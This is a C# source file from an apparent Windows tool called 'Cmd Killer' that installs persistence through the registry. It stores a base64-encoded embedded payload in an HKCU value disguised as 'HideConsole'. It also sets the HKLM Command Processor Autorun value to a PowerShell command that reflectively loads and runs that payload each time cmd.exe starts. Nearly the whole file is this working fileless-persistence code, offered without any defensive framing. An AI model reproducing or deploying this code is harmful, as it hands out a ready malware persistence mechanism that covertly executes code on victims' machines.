using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace Cmd___Terminal_Killer
{
    public class CmdKiller
    {
        static void emptyLine()
        {
            Form1.logger.Log("");
        }

        static void log(string msg)
        {
            Form1.logger.Log("[Cmd Killer] " + msg);
        }

        public static void Install()
        {
            log("    ### Installing Cmd Killer ###");

            log("Checking if \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Command Processor\" registry exists and creating it if it does not...");
            CheckForAndCreate_HKLM();

            log("Checking if \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Command Processor\" registry exists and creating it if it does not...");
            CheckForAndCreate_HKCU();

            log("Setting registry value of \"Autorun\" in registry key \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Command Processor\"");
            SetHKLM_Autorun();

            log("Dumping payload to value of \"HideConsole\" in registry key \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Command Processor\"");
            SetHKCU_Bins();

            log("Installed!");
            emptyLine();
        }

        public static void Uninstall()
        {
            log("    ### Uninstalling Cmd Killer ###");

            log("Deleting registry value of \"Autorun\" in registry key \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Command Processor\"");
            DeleteHKLM_Autorun();

            log("Deleting registry value of \"HideConsole\" in registry key \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Command Processor\"");
            RemoveHKCU_Bins();

            log("Uninstalled!");
            emptyLine();
        }

        public static bool RegistryKeyExists(RegistryHive hive, string subKey)
        {
            using (var baseKey = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64))
            using (var key = baseKey.OpenSubKey(subKey))
            {
                return key != null;
            }
        }

        public static void SetHKLM_Autorun()
        {
            
            RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(@"Software\Microsoft\Command Processor", RegistryKeyPermissionCheck.ReadWriteSubTree);
            key.SetValue("Autorun", "powershell.exe -c [Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-ItemPropertyValue -Path 'Registry::HKEY_CURRENT_USER\\Software\\Microsoft\\Command Processor' -Name 'HideConsole'))).EntryPoint.Invoke($null, @());", RegistryValueKind.String);
            key.Close();
        }

        public static void DeleteHKLM_Autorun()
        {
            try
            {
                RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey(@"Software\Microsoft\Command Processor", RegistryKeyPermissionCheck.ReadWriteSubTree);
                // Open the registry key for writing
                key.DeleteValue("Autorun");
                key.Close();
            }
            catch (System.ArgumentException ex)
            {
                if (ex.Message.Contains( "No value exists with that name."))
                {
                    log("Autorun value does not exist! Skipping!");
                }
            }
        }

        public static void SetHKCU_Bins()
        {
            RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey(@"Software\Microsoft\Command Processor", RegistryKeyPermissionCheck.ReadWriteSubTree);
            key.SetValue("HideConsole", Convert.ToBase64String(Properties.Resources.Payload), RegistryValueKind.String);
            key.Close();
        }

        public static void RemoveHKCU_Bins()
        {
            try
            {
                RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64).OpenSubKey(@"Software\Microsoft\Command Processor", RegistryKeyPermissionCheck.ReadWriteSubTree);
                key.DeleteValue("HideConsole");
                key.Close();
            }
            catch (System.ArgumentException ex)
            {
                if (ex.Message.Contains("No value exists with that name."))
                {
                    log("HideConsole value does not exist! Skipping!");
                }
            }
            
        }

        public static void CheckForAndCreate_HKLM()
        {
            // Check if the registry key exists
            bool keyExists = RegistryKeyExists(RegistryHive.LocalMachine, @"Software\Microsoft\Command Processor");

            if (!keyExists)
            {
                RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
                key.CreateSubKey(@"Software\Microsoft\Command Processor");
                key.Close();
            }
        }

        public static void CheckForAndCreate_HKCU()
        {
            // Check if the registry key exists
            bool keyExists = RegistryKeyExists(RegistryHive.CurrentUser, @"Software\Microsoft\Command Processor");

            if (!keyExists)
            {
                RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
                key.CreateSubKey(@"Software\Microsoft\Command Processor");
                key.Close();
            }
        }
    }
}
